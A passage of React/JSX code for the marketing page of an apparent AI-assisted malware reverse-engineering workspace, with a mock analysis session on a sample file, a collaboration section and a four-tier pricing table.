                  <span style={{ fontFamily: "'Instrument Serif', serif", fontStyle: 'italic', fontSize: 17, color: theme.brand, lineHeight: 1 }}>m</span>
                  <span style={{ fontFamily: serif, fontSize: 13, fontWeight: 600, letterSpacing: '-0.02em', color: theme.ink }}>melani</span>
                </div>
                {!isMobile && <>
                  <span style={{ color: theme.muted, opacity: 0.5 }}>/</span>
                  <span style={{ color: theme.muted }}>Workspace</span>
                  <span style={{ color: theme.muted, opacity: 0.5 }}>/</span>
                  <span style={{ color: theme.muted }}>Live Session</span>
                  <span style={{ color: theme.muted, opacity: 0.5 }}>/</span>
                  <span style={{ color: theme.ink, fontWeight: 500, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>stager_x64.elf</span>
                </>}
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                  <div style={{ width: 6, height: 6, borderRadius: 6, background: theme.success || '#22c55e', boxShadow: `0 0 0 2px ${(theme.success || '#22c55e')}25` }} />
                  <span style={{ fontFamily: mono, fontSize: 9.5, color: theme.muted, letterSpacing: '0.08em' }}>ANALYZED</span>
                </div>
                {!isMobile && <div style={{ width: 1, height: 18, background: theme.rule }} />}
                {!isMobile && (
                  <div style={{ display: 'flex', alignItems: 'center' }} title="3 teammates in this session">
                    {[
                      { i: 'JM', c: '#9333ea' },
                      { i: 'RS', c: '#22c55e' },
                      { i: 'TL', c: '#f59e0b' },
                    ].map((a, i) => (
                      <div key={a.i} style={{
                        width: 22, height: 22, borderRadius: 999,
                        background: a.c, color: '#fff',
                        fontFamily: mono, fontSize: 9, fontWeight: 700,
                        display: 'grid', placeItems: 'center',
                        border: `2px solid ${theme.bg}`,
                        marginLeft: i === 0 ? 0 : -7,
                        letterSpacing: '0.02em',
                      }}>{a.i}</div>
                    ))}
                  </div>
                )}
                {!isMobile && (
                  <button style={{
                    display: 'inline-flex', alignItems: 'center', gap: 6,
                    padding: '5px 10px', borderRadius: 6,
                    background: theme.brand, color: '#fff',
                    border: 'none', cursor: 'pointer',
                    fontFamily: mono, fontSize: 10.5, letterSpacing: '0.06em', fontWeight: 600,
                  }}>
                    <NavIcon kind="share" color="#fff" />
                    Share
                  </button>
                )}
                {!isMobile && <div style={{ width: 1, height: 18, background: theme.rule }} />}
                {!isMobile && (
                  <div style={{ width: 26, height: 26, borderRadius: 999, background: theme.brand, color: '#fff', fontFamily: mono, fontSize: 10.5, fontWeight: 600, display: 'grid', placeItems: 'center', letterSpacing: '0.04em' }}>EC</div>
                )}
              </div>
            </div>

            {/* Body wrap: sidebar + main */}
            <div style={{ flex: 1, display: 'flex', overflow: 'hidden', minHeight: 0 }}>
              {/* Sidebar nav (desktop only) */}
              {!isTablet && (
                <div style={{
                  width: sidebarW, flexShrink: 0,
                  display: 'flex', flexDirection: 'column',
                  background: theme.mode === 'dark' ? '#08080a' : theme.cream,
                  borderRight: `1px solid ${theme.rule}`,
                  padding: '14px 0',
                }}>
                  {navSections.map((sec, si) => (
                    <div key={sec.label} style={{ marginBottom: 18 }}>
                      <div style={{ padding: '0 16px 6px', fontFamily: mono, fontSize: 9, letterSpacing: '0.18em', color: theme.muted, fontWeight: 500 }}>{sec.label}</div>
                      {sec.items.map((it, ii) => (
                        <div key={it.label} style={{
                          display: 'flex', alignItems: 'center', gap: 10,
                          padding: '7px 16px',
                          background: it.active ? brandFaint : 'transparent',
                          borderLeft: it.active ? `2px solid ${theme.brand}` : '2px solid transparent',
                          color: it.active ? theme.brand : theme.inkSoft,
                          fontFamily: 'inherit', fontSize: 12.5, cursor: 'pointer',
                        }}>
                          <NavIcon kind={it.icon} color={it.active ? theme.brand : theme.muted} />
                          <span style={{ fontWeight: it.active ? 500 : 400, flex: 1 }}>{it.label}</span>
                          {it.badge && (
                            <span style={{
                              fontFamily: mono, fontSize: 9.5, fontWeight: 600,
                              padding: '1px 6px', borderRadius: 999,
                              background: theme.brand, color: '#fff',
                              letterSpacing: '0.04em',
                            }}>{it.badge}</span>
                          )}
                        </div>
                      ))}
                    </div>
                  ))}
                  <div style={{ flex: 1 }} />
                  <div style={{ padding: '12px 16px', borderTop: `1px solid ${theme.rule}`, fontFamily: mono, fontSize: 10, color: theme.muted, letterSpacing: '0.08em' }}>
                    <div style={{ color: theme.ink, fontWeight: 500, fontSize: 12, fontFamily: serif, letterSpacing: '-0.01em', marginBottom: 2 }}>4,128</div>
                    <div>SAMPLES / WK</div>
                  </div>
                </div>
              )}

              {/* Main column */}
              <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0, background: theme.bg }}>
                {/* Page title bar */}
                <div style={{
                  display: 'flex', alignItems: 'center', justifyContent: 'space-between',
                  padding: isMobile ? '14px 14px 10px' : '18px 22px 14px',
                  flexShrink: 0,
                }}>
                  <div style={{ minWidth: 0 }}>
                    <div style={{ fontFamily: serif, fontSize: isMobile ? 18 : 22, fontWeight: 600, letterSpacing: '-0.02em', color: theme.ink, lineHeight: 1.1 }}>
                      Attack Capture · stager_x64.elf
                    </div>
                    <div style={{ fontFamily: mono, fontSize: 10.5, color: theme.muted, letterSpacing: '0.05em', marginTop: 6, display: 'flex', gap: 12, flexWrap: 'wrap' }}>
                      <span>ELF · 64-bit · 412 KB</span>
                      <span style={{ opacity: 0.4 }}>·</span>
                      <span>SHA256 9f4a…2c81</span>
                      {!isMobile && <><span style={{ opacity: 0.4 }}>·</span><span>Analyzed 4m 32s ago</span></>}
                    </div>
                  </div>
                  {!isMobile && (
                    <div style={{ display: 'flex', gap: 8, flexShrink: 0 }}>
                      <button style={{ padding: '7px 12px', borderRadius: 6, background: 'transparent', border: `1px solid ${theme.rule}`, fontFamily: mono, fontSize: 10.5, letterSpacing: '0.04em', color: theme.inkSoft, cursor: 'pointer' }}>Export</button>
                      <button style={{ padding: '7px 12px', borderRadius: 6, background: theme.ink, border: 'none', fontFamily: mono, fontSize: 10.5, letterSpacing: '0.04em', color: theme.bg, cursor: 'pointer' }}>Settings ⚙</button>
                    </div>
                  )}
                </div>

                {/* Stat cards */}
                <div style={{
                  display: 'grid',
                  gridTemplateColumns: isMobile ? 'repeat(2, 1fr)' : isTablet ? 'repeat(3, 1fr)' : 'repeat(5, 1fr)',
                  gap: 10,
                  padding: isMobile ? '0 14px 12px' : '0 22px 16px',
                  flexShrink: 0,
                }}>
                  {stats.map(s => (
                    <div key={s.label} style={{
                      padding: '10px 12px',
                      background: theme.paper,
                      border: `1px solid ${theme.rule}`,
                      borderRadius: 8,
                    }}>
                      <div style={{ fontFamily: mono, fontSize: 9, letterSpacing: '0.14em', color: theme.muted, textTransform: 'uppercase', marginBottom: 4 }}>{s.label}</div>
                      <div style={{ display: 'flex', alignItems: 'baseline', gap: 4 }}>
                        <span style={{ fontFamily: serif, fontSize: 22, fontWeight: 600, letterSpacing: '-0.02em', color: s.accent ? theme.brand : theme.ink, lineHeight: 1 }}>{s.value}</span>
                        {s.suffix && <span style={{ fontFamily: mono, fontSize: 11, color: theme.muted }}>{s.suffix}</span>}
                      </div>
                    </div>
                  ))}
                </div>

                {/* Threat tags row */}
                {!isMobile && (
                  <div style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '0 22px 14px', flexWrap: 'wrap', flexShrink: 0 }}>
                    <span style={{ fontFamily: mono, fontSize: 9.5, letterSpacing: '0.14em', color: theme.muted }}>TAGS</span>
                    {threatTags.map(t => (
                      <span key={t.label} style={{
                        fontFamily: mono, fontSize: 10, padding: '3px 8px', borderRadius: 999,
                        background: t.susp ? brandFaint : theme.cream,
                        color: t.susp ? theme.brand : theme.inkSoft,
                        border: t.susp ? `1px solid ${theme.brandRing}` : `1px solid ${theme.rule}`,
                        letterSpacing: t.kind === 'mitre' ? '0.06em' : '0',
                      }}>{t.kind === 'mitre' && '⚑ '}{t.label}</span>
                    ))}
                  </div>
                )}

                {/* 3-panel work area */}
                <div style={{ flex: 1, display: 'flex', overflow: 'hidden', minHeight: 0, borderTop: `1px solid ${theme.rule}` }}>
              {/* Functions panel — desktop+tablet */}
              {!isMobile && (
                <div style={{
                  width: fnW, flexShrink: 0,
                  display: 'flex', flexDirection: 'column',
                  background: theme.paper,
                }}>
                  <div style={{ padding: '12px 14px 8px', borderBottom: `1px solid ${theme.rule}`, display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontFamily: mono, fontSize: 10.5, letterSpacing: '0.08em', color: theme.ink, fontWeight: 500 }}>Functions</span>
                    <span style={{ fontFamily: mono, fontSize: 9.5, color: theme.muted, background: theme.cream, padding: '2px 6px', borderRadius: 8 }}>{filteredFns.length}</span>
                  </div>
                  <div style={{ display: 'flex', gap: 3, padding: '8px 10px 10px', borderBottom: `1px solid ${theme.rule}`, flexWrap: 'wrap' }}>
                    {filterTabs.map(f => (
                      <button key={f.key} onClick={() => setFilter(f.key)} style={{
                        display: 'flex', alignItems: 'center', gap: 4, padding: '3px 7px', borderRadius: 5,
                        border: filter === f.key ? `1px solid ${theme.brandRing}` : '1px solid transparent',
                        background: filter === f.key ? brandFaint : 'transparent',
                        color: filter === f.key ? theme.brand : theme.muted,
                        fontFamily: mono, fontSize: 10, cursor: 'pointer',
                      }}>{f.label}<span style={{ opacity: 0.6, fontSize: 9.5 }}>{f.count}</span></button>
                    ))}
                  </div>
                  <div style={{ flex: 1, overflowY: 'auto' }}>
                    {filteredFns.map(fn => {
                      const isSel = selectedAddr === fn.addr;
                      const hasContent = !!FN_CONTENT[fn.addr];
                      return (
                        <button key={fn.addr} onClick={() => hasContent && setSelectedAddr(fn.addr)} style={{
                          width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8,
                          padding: '8px 12px 8px 11px', border: 'none',
                          cursor: hasContent ? 'pointer' : 'default',
                          textAlign: 'left',
                          background: isSel ? brandFaint : 'transparent',
                          borderLeft: isSel ? `2px solid ${theme.brand}` : '2px solid transparent',
                          fontFamily: 'inherit',
                          opacity: hasContent ? 1 : 0.6,
                        }}>
                          <div style={{ display: 'flex', flexDirection: 'column', gap: 2, minWidth: 0 }}>
                            <span style={{ fontFamily: mono, fontSize: 9.5, color: fn.suspicious ? theme.brand : theme.muted }}>{fn.addr}</span>
                            <span style={{ fontFamily: mono, fontSize: 12, color: fn.renamed ? theme.ink : theme.muted, fontStyle: fn.renamed ? 'normal' : 'italic', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>{fn.name}</span>
                          </div>
                          <div style={{ display: 'flex', alignItems: 'center', gap: 5, flexShrink: 0 }}>
                            {fn.suspicious && <span style={{ fontSize: 11, color: theme.brand }}>⚠</span>}
                            <span style={{ fontFamily: mono, fontSize: 9, color: theme.muted, background: theme.cream, padding: '1px 5px', borderRadius: 6 }}>{fn.xrefs}×</span>
                          </div>
                        </button>
                      );
                    })}
                  </div>
                </div>
              )}

              {/* Center — tabbed views with optional split */}
              {!isMobile && (
                <div
                  onMouseDown={startDrag('fn')}
                  title="Resize functions panel"
                  style={{
                    width: 9,
                    flexShrink: 0,
                    cursor: 'col-resize',
                    background: theme.bg,
                    borderLeft: `1px solid ${theme.rule}`,
                    borderRight: `1px solid ${theme.rule}`,
                    display: 'grid',
                    placeItems: 'center',
                  }}
                >
                  <div style={{ width: 2, height: 34, borderRadius: 2, background: theme.rule }} />
                </div>
              )}

              <div style={{ flex: 1, display: 'flex', flexDirection: 'column', minWidth: 0, background: theme.paper }}>
                {/* Tab bar */}
                <div style={{ display: 'flex', alignItems: 'center', gap: 4, padding: '6px 10px', borderBottom: `1px solid ${theme.rule}`, background: theme.bg, flexShrink: 0, overflowX: 'auto' }}>
                  {split && <span style={{ fontFamily: mono, fontSize: 9, letterSpacing: '0.16em', color: theme.muted, padding: '0 6px', flexShrink: 0 }}>TOP</span>}
                  {tabs.map(t => (
                    <button key={t.key} onClick={() => setTopTab(t.key)} style={tabBtnStyle(topTab === t.key)}>{t.label}</button>
                  ))}
                  <div style={{ flex: 1, minWidth: 8 }} />
                  {split && (
                    <>
                      <div style={{ width: 1, height: 18, background: theme.rule, margin: '0 4px', flexShrink: 0 }} />
                      <span style={{ fontFamily: mono, fontSize: 9, letterSpacing: '0.16em', color: theme.muted, padding: '0 6px', flexShrink: 0 }}>BTM</span>
                      {tabs.filter(x => x.key !== topTab).slice(0, 4).map(t => (
                        <button key={'b' + t.key} onClick={() => setBottomTab(t.key)} style={tabBtnStyle(bottomTab === t.key)}>{t.label}</button>
                      ))}
                    </>
                  )}
                  {!isMobile && !isTablet && (
                    <>
                      <div style={{ width: 1, height: 18, background: theme.rule, margin: '0 6px', flexShrink: 0 }} />
                      <button onClick={() => setSplit(s => !s)} style={tabBtnStyle(split)}>Split</button>
                    </>
                  )}
                </div>

                {split ? (
                  <>
                    <div style={{ height: `${splitPct}%`, display: 'flex', flexDirection: 'column', overflow: 'hidden' }}>
                      {panelHeader(topTab, 'TOP')}
                      {renderPanel(topTab)}
                    </div>
                    <div
                      onMouseDown={startDrag('split')}
                      title="Resize split view"
                      style={{
                        height: 9,
                        flexShrink: 0,
                        cursor: 'row-resize',
                        background: theme.bg,
                        borderTop: `1px solid ${theme.rule}`,
                        borderBottom: `1px solid ${theme.rule}`,
                        display: 'grid',
                        placeItems: 'center',
                      }}
                    >
                      <div style={{ width: 34, height: 2, borderRadius: 2, background: theme.rule }} />
                    </div>
                    <div style={{ flex: 1, display: 'flex', flexDirection: 'column', overflow: 'hidden', minHeight: 0 }}>
                      {panelHeader(bottomTab, 'BOTTOM')}
                      {renderPanel(bottomTab)}
                    </div>
                  </>
                ) : (
                  renderPanel(topTab)
                )}
              </div>

              {/* Chat panel — desktop only */}
              {!isTablet && (
                <>
                <div
                  onMouseDown={startDrag('chat')}
                  title="Resize Melani panel"
                  style={{
                    width: 9,
                    flexShrink: 0,
                    cursor: 'col-resize',
                    background: theme.bg,
                    borderLeft: `1px solid ${theme.rule}`,
                    borderRight: `1px solid ${theme.rule}`,
                    display: 'grid',
                    placeItems: 'center',
                  }}
                >
                  <div style={{ width: 2, height: 34, borderRadius: 2, background: theme.rule }} />
                </div>
                <div style={{
                  width: chatW, flexShrink: 0,
                  display: 'flex', flexDirection: 'column',
                  background: theme.paper,
                }}>
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '10px 14px', borderBottom: `1px solid ${theme.rule}`, background: theme.bg }}>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                      <span style={{ fontFamily: "'Instrument Serif', serif", fontStyle: 'italic', fontSize: 16, color: theme.brand, lineHeight: 1 }}>m</span>
                      <span style={{ fontFamily: serif, fontSize: 13, fontWeight: 600, color: theme.ink }}>Melani</span>
                      <span style={{ fontFamily: mono, fontSize: 9.5, color: theme.muted, background: theme.cream, padding: '2px 6px', borderRadius: 8 }}>opus-4</span>
                    </div>
                  </div>
                  <div style={{ display: 'flex', alignItems: 'center', gap: 6, padding: '7px 14px', borderBottom: `1px solid ${theme.rule}`, background: theme.cream, overflow: 'hidden', flexWrap: 'wrap' }}>
                    <span style={{ color: theme.inkSoft, fontSize: 11 }}>Context:</span>
                    {[selectedFn.name, selectedFn.addr].map(c => (
                      <span key={c} style={{ fontFamily: mono, fontSize: 10, color: theme.brand, background: theme.paper, border: `1px solid ${theme.rule}`, padding: '2px 7px', borderRadius: 10 }}>{c}</span>
                    ))}
                  </div>
                  <div style={{ flex: 1, overflow: 'auto', padding: '14px 14px', display: 'flex', flexDirection: 'column', gap: 14 }}>
                    {content.chat.map((m, i) => (
                      <div key={i} style={{ display: 'flex', flexDirection: 'column', gap: 4, alignSelf: m.role === 'user' ? 'flex-end' : 'flex-start', maxWidth: m.role === 'user' ? '85%' : '92%' }}>
                        {m.role === 'ai' && <div style={{ fontFamily: mono, fontSize: 9, letterSpacing: '0.12em', color: theme.brand, fontWeight: 500 }}>MELANI</div>}
                        <div style={{
                          fontSize: 12.5, lineHeight: 1.5,
                          padding: m.role === 'user' ? '8px 12px' : '10px 12px',
                          borderRadius: m.role === 'user' ? '12px 12px 4px 12px' : '12px 12px 12px 4px',
                          background: m.role === 'user' ? theme.ink : theme.bg,
                          color: m.role === 'user' ? theme.bg : theme.ink,
                          border: m.role === 'ai' ? `1px solid ${theme.rule}` : 'none',
                        }}>
                          {m.text}
                          {m.cites && (
                            <div style={{ marginTop: 8, display: 'flex', gap: 4, flexWrap: 'wrap' }}>
                              {m.cites.map(c => <span key={c} style={{ fontFamily: mono, fontSize: 10, padding: '2px 6px', borderRadius: 8, background: theme.paper, border: `1px solid ${theme.rule}`, color: theme.brand }}>{c}</span>)}
                            </div>
                          )}
                        </div>
                      </div>
                    ))}
                  </div>
                  <div style={{ padding: '10px 12px', borderTop: `1px solid ${theme.rule}`, background: theme.bg }}>
                    <div style={{ display: 'flex', gap: 6, alignItems: 'center', background: theme.paper, border: `1px solid ${theme.rule}`, borderRadius: 10, padding: '4px 4px 4px 12px' }}>
                      <span style={{ flex: 1, fontFamily: 'inherit', fontSize: 12.5, color: theme.muted, padding: '7px 0' }}>Ask about this binary…</span>
                      <button style={{ width: 30, height: 30, borderRadius: 8, background: theme.ink, color: theme.bg, border: 'none', cursor: 'pointer', display: 'grid', placeItems: 'center' }}>
                        <svg width="14" height="14" viewBox="0 0 16 16" fill="none">
                          <path d="M2 8h12M10 4l4 4-4 4" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round" />
                        </svg>
                      </button>
                    </div>
                  </div>
                </div>
                </>
              )}
                </div>
              </div>
            </div>
            {!isMobile && (
              <div
                onMouseDown={startDrag('workspace')}
                title="Resize workspace dashboard"
                style={{
                  position: 'absolute',
                  right: 0,
                  bottom: 0,
                  width: 24,
                  height: 24,
                  cursor: 'nwse-resize',
                  display: 'grid',
                  placeItems: 'end',
                  padding: 5,
                  background: `linear-gradient(135deg, transparent 0 46%, ${theme.bg} 47% 100%)`,
                }}
              >
                <svg width="13" height="13" viewBox="0 0 13 13" fill="none" aria-hidden="true">
                  <path d="M12 1L1 12M12 6L6 12M12 10L10 12" stroke={theme.muted} strokeWidth="1.2" strokeLinecap="round" />
                </svg>
              </div>
            )}
          </div>
        </Reveal>

        <Reveal y={20} duration={700} delay={150}>
          <div style={{
            marginTop: isMobile ? 28 : 36,
            display: 'grid',
            gridTemplateColumns: isTablet ? '1fr' : 'repeat(3, 1fr)',
            gap: isMobile ? 18 : 28,
          }}>
            {[
              { eyebrow: 'FUNCTIONS', title: 'Triage at a glance', body: 'Suspicious calls, renamed targets, and cross-references surface in one column. Click anything to follow it through.' },
              { eyebrow: 'DISASSEMBLY', title: 'Citations on every line', body: 'Every byte, jump, and call is addressable. Melani points back to exact instructions, not vibes.' },
              { eyebrow: 'CONVERSATION', title: 'Ask in plain English', body: 'Context tracks the function you are looking at. Answers come grounded in the bytes, not pulled from training data.' },
            ].map((c, i) => (
              <div key={i}>
                <div style={{ fontFamily: mono, fontSize: 10, letterSpacing: '0.16em', color: theme.brand, marginBottom: 10 }}>{c.eyebrow}</div>
                <h3 style={{ fontFamily: serif, fontSize: 21, lineHeight: 1.2, letterSpacing: '-0.02em', fontWeight: 600, margin: '0 0 8px', color: theme.ink }}>{c.title}</h3>
                <p style={{ fontSize: 14.5, lineHeight: 1.6, color: theme.inkSoft, margin: 0, maxWidth: 360 }}>{c.body}</p>
              </div>
            ))}
          </div>
        </Reveal>
      </div>
    </div>
  );
}

// ───────────────────── COLLAB ─────────────────────
function VACollab({ theme, serif, mono }) {
  const { isMobile, isTablet } = useResponsive();
  const cards = [
    {
      eyebrow: 'SHARED WORKSPACES',
      title: 'One canvas. Whole team.',
      body: 'Renames, notes, and citations sync across analysts. Hand off a session mid-investigation without rebuilding context.',
    },
    {
      eyebrow: 'CLOUD COMPUTE',
      title: 'No laptop melts.',
      body: 'Disassembly, indexing, and analysis run in the cloud. Teammates open the same sample without re-uploading or re-indexing.',
    },
    {
      eyebrow: 'AUDIT TRAIL',
      title: 'Who did what, when.',
      body: 'Every annotation, rule draft, and answer is attributed and timestamped. Reviewable for IR reports and team retros.',
    },
  ];
  return (
    <div style={{ padding: isMobile ? '92px 24px' : isTablet ? '116px 32px' : '140px 48px' }}>
      <div style={{ maxWidth: 1120, margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="05" text="COLLABORATION" /></Reveal>
        <div style={{
          display: 'grid',
          gridTemplateColumns: isTablet ? '1fr' : '1.1fr 1fr',
          gap: isTablet ? 28 : 64,
          marginTop: 24,
          alignItems: 'start',
        }}>
          <Reveal y={28} duration={800}>
            <h2 style={{
              fontFamily: serif,
              fontSize: isMobile ? 'clamp(38px, 11vw, 50px)' : 'clamp(44px, 4.4vw, 60px)',
              lineHeight: 1.05,
              letterSpacing: '-0.02em',
              fontWeight: 600,
              margin: 0,
            }}>
              Reverse engineering shouldn't be a <span style={{ color: theme.brand }}>solo sport</span>.
            </h2>
          </Reveal>
          <Reveal delay={150} y={20}>
            <p style={{
              fontSize: isMobile ? 16 : 17,
              lineHeight: 1.7,
              color: theme.inkSoft,
              margin: 0,
              maxWidth: 520,
              borderLeft: !isMobile ? `1px solid ${theme.rule}` : 'none',
              paddingLeft: !isMobile ? 28 : 0,
              textWrap: 'pretty',
            }}>
              Share a workspace link, pin a hypothesis, review cited findings, and hand the case
              off without losing context. The session, comments, and citations stay together.
            </p>
          </Reveal>
        </div>

        <Reveal y={32} duration={900}>
          <div style={{
            marginTop: isMobile ? 48 : 72,
            display: 'grid',
            gridTemplateColumns: isTablet ? '1fr' : 'repeat(3, 1fr)',
            gap: isTablet ? 16 : 18,
          }}>
            {cards.map((c, i) => (
              <div key={i} style={{
                background: theme.paper,
                border: `1px solid ${theme.rule}`,
                borderRadius: 14,
                padding: isMobile ? 22 : 26,
              }}>
                <div style={{
                  fontFamily: mono,
                  fontSize: 10.5,
                  letterSpacing: '0.18em',
                  color: theme.brand,
                  fontWeight: 600,
                  marginBottom: 14,
                }}>
                  {c.eyebrow}
                </div>
                <div style={{
                  fontFamily: serif,
                  fontSize: isMobile ? 22 : 24,
                  letterSpacing: '-0.01em',
                  color: theme.ink,
                  marginBottom: 10,
                }}>
                  {c.title}
                </div>
                <div style={{ fontSize: 14, color: theme.inkSoft, lineHeight: 1.6, textWrap: 'pretty' }}>
                  {c.body}
                </div>
              </div>
            ))}
          </div>
        </Reveal>

        {/* Avatar + presence strip — visual cue for live collab */}
        <Reveal y={20} delay={200}>
          <div style={{
            marginTop: isMobile ? 36 : 56,
            padding: isMobile ? '20px 22px' : '22px 28px',
            border: `1px solid ${theme.rule}`,
            borderRadius: 14,
            background: theme.bg,
            display: 'flex',
            alignItems: 'center',
            gap: 16,
            flexWrap: 'wrap',
          }}>
            <div style={{ display: 'flex' }}>
              {['#0062D1', '#9333ea', '#22c55e', '#f59e0b'].map((bg, i) => (
                <div key={i} style={{
                  width: 30, height: 30, borderRadius: 999,
                  background: bg,
                  border: `2px solid ${theme.bg}`,
                  marginLeft: i === 0 ? 0 : -8,
                  display: 'grid',
                  placeItems: 'center',
                  color: '#fff',
                  fontSize: 11,
                  fontWeight: 700,
                  fontFamily: mono,
                }}>{['AK', 'JM', 'RS', 'TL'][i]}</div>
              ))}
            </div>
            <div style={{ fontSize: 13.5, color: theme.inkSoft, flex: 1, minWidth: 200 }}>
              <span style={{ color: theme.ink, fontWeight: 600 }}>4 analysts</span> on{' '}
              <span style={{ fontFamily: mono, color: theme.brand }}>stager_x64.elf</span>
              {' · '}
              <span style={{ color: theme.muted }}>14 annotations · 3 detections drafted</span>
            </div>
            <div style={{
              fontFamily: mono,
              fontSize: 10.5,
              letterSpacing: '0.18em',
              color: theme.brand,
              fontWeight: 600,
              display: 'inline-flex',
              alignItems: 'center',
              gap: 8,
            }}>
              <span style={{ width: 6, height: 6, borderRadius: 999, background: theme.brand, boxShadow: `0 0 8px ${theme.brand}` }} />
              LIVE
            </div>
          </div>
        </Reveal>
      </div>
    </div>
  );
}

// ───────────────────── PRICING ─────────────────────
function VAPricing({ theme, serif, mono }) {
  const { isMobile, isTablet } = useResponsive();
  const tiers = [
    {
      name: 'Trial',
      price: 'Free',
      cadence: '14 days',
      tagline: 'Evaluate the workspace.',
      specs: { analyses: '3 analyses', sample: '1 MB sample', ai: 'No AI' },
      features: [
        'Static triage view',
        'Disassembly, strings, imports',
        'Suspicious API flags',
        'Markdown export',
      ],
      cta: 'Start free trial',
      featured: false,
    },
    {
      name: 'Starter',
      price: '$9',
      cadence: '/ month',
      tagline: 'For solo researchers and CTF players.',
      specs: { analyses: '10 / month', sample: '5 MB sample', ai: 'Standard AI' },
      features: [
        'Everything in Trial',
        'AI chat with citations',
        'Function rename suggestions',
        'Markdown + JSON export',
        'Email support',
      ],
      cta: 'Get Starter',
      featured: false,
    },
    {
      name: 'Pro',
      price: '$29',
      cadence: '/ analyst / month',
      tagline: 'For working analysts running daily RE.',
      specs: { analyses: '50 / month', sample: '100 MB sample', ai: 'Advanced AI' },
      features: [
        'Everything in Starter',
        'Deep decompiler output',
        'YARA assistant + clustering',
        'Bring-your-own-key (Anthropic / OpenAI)',
        'Priority queue + advanced exports',
      ],
      cta: 'Get Pro',
      featured: true,
    },
    {
      name: 'Team',
      price: 'Custom',
      cadence: 'volume + SSO',
      tagline: 'For SOCs, IR teams, and research labs.',
      specs: { analyses: 'Pooled', sample: '500 MB+', ai: 'Managed or BYO' },
      features: [
        'Everything in Pro',
        'Shared workspaces + live collab',
        'Role-based access + audit log',
        'SSO / SAML + retention controls',
        'Private deployment options',
      ],
      cta: 'Talk to sales',
      featured: false,
    },
  ];
  return (
    <div style={{ padding: isMobile ? '92px 24px' : isTablet ? '116px 32px' : '140px 48px' }}>
      <div style={{ maxWidth: 1180, margin: '0 auto' }}>
        <Reveal><SectionEyebrow mono={mono} theme={theme} num="09" text="PRICING" /></Reveal>
        <div style={{
          display: 'grid',
          gridTemplateColumns: isTablet ? '1fr' : '1fr 1fr',
          gap: isTablet ? 24 : 64,
          alignItems: 'end',
          marginTop: 20,
          marginBottom: isMobile ? 40 : 64,
        }}>
          <Reveal y={28} duration={800}>
            <h2 style={{
              fontFamily: serif,
              fontSize: 'clamp(40px, 4.4vw, 60px)',
              lineHeight: 1.05,
              letterSpacing: '-0.02em',
              fontWeight: 600,
              margin: 0,
            }}>
              Simple plans. <span style={{ color: theme.brand }}>Pay for what you use.</span>
            </h2>
          </Reveal>
          <Reveal delay={150} y={20}>
            <p style={{ fontSize: 16, color: theme.inkSoft, margin: 0, lineHeight: 1.6, textWrap: 'pretty' }}>
              Free 14-day trial. Pick the plan that matches your sample volume and team needs.
              Bring-your-own-key on Pro and Team to keep inference costs in your control.
            </p>
          </Reveal>
        </div>

        {/* Security trust strip */}
        <Reveal y={16} delay={80}>
        <div style={{
          display: 'flex',
          flexWrap: 'wrap',
          gap: isMobile ? 12 : 24,
          alignItems: 'center',
          justifyContent: isMobile ? 'flex-start' : 'center',
          padding: isMobile ? '16px 0 32px' : '0 0 40px',
          borderBottom: `1px solid ${theme.rule}`,
          marginBottom: isMobile ? 32 : 48,
        }}>
          {[
            'Isolated workspaces',
            'Samples never shared',
            'Access controls',
            'Bring-your-own-key',
            'Private deployment options',
          ].map((item) => (
            <div key={item} style={{
              display: 'flex', alignItems: 'center', gap: 7,
              fontSize: 13, color: theme.muted, fontFamily: mono,
            }}>
              <svg width="12" height="12" viewBox="0 0 12 12" fill="none">
                <path d="M2 6.5l2.8 2.8L10 3.5" stroke={theme.brand} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round" />
              </svg>
              {item}
            </div>
          ))}
        </div>
        </Reveal>

        <div style={{
          display: 'grid',
          gridTemplateColumns: isMobile ? '1fr' : isTablet ? 'repeat(2, 1fr)' : 'repeat(4, 1fr)',
          gap: 18,
        }}>
          {tiers.map((t, i) => {
            const accent = t.featured;
            const cardBg = accent ? theme.bg : theme.bg;
            const cardBorder = accent ? theme.brand : theme.rule;
            const muted = accent ? theme.inkSoft : theme.muted;
            return (
            <Reveal key={t.name} y={24} delay={i * 100}>
              <div style={{
                background: cardBg,
                color: theme.ink,
                border: `1px solid ${cardBorder}`,
                borderRadius: 14,
                padding: isMobile ? 26 : 28,
                position: 'relative',
                display: 'flex',
                flexDirection: 'column',
                gap: 22,
                height: '100%',
                boxShadow: accent
                  ? `0 0 0 3px ${theme.brandSoft}, 0 24px 60px -30px ${theme.brandRing}`
                  : '0 1px 0 rgba(0,0,0,0.02)',
                transition: 'transform .2s ease, box-shadow .2s ease',
              }}>
                {accent && (
                  <div style={{
                    position: 'absolute',
                    top: -11,
                    left: 20,
                    fontFamily: mono,
                    fontSize: 10,
                    letterSpacing: '0.18em',
                    fontWeight: 700,
                    padding: '4px 10px',
                    borderRadius: 999,
                    background: theme.brand,
                    color: '#fff',
                  }}>
                    POPULAR
                  </div>
                )}

                {/* Header */}
                <div>
                  <div style={{
                    fontFamily: mono,
                    fontSize: 10.5,
                    letterSpacing: '0.18em',
                    color: muted,
                    fontWeight: 600,
                    marginBottom: 14,
                  }}>
                    {t.name.toUpperCase()}
                  </div>
                  <div style={{ display: 'flex', alignItems: 'baseline', gap: 6, flexWrap: 'wrap' }}>
                    <span style={{
                      fontFamily: serif,
                      fontSize: isMobile ? 38 : 42,
                      letterSpacing: '-0.03em',
                      fontWeight: 600,
                      lineHeight: 1,
                      color: theme.ink,
                    }}>
                      {t.price}
                    </span>
                    <span style={{
                      fontSize: 12.5,
                      color: muted,
                    }}>
                      {t.cadence}
                    </span>
                  </div>
                  <p style={{
                    fontSize: 13.5,
                    lineHeight: 1.5,
                    color: theme.inkSoft,
                    margin: '14px 0 0',
                    textWrap: 'pretty',
                    minHeight: 38,
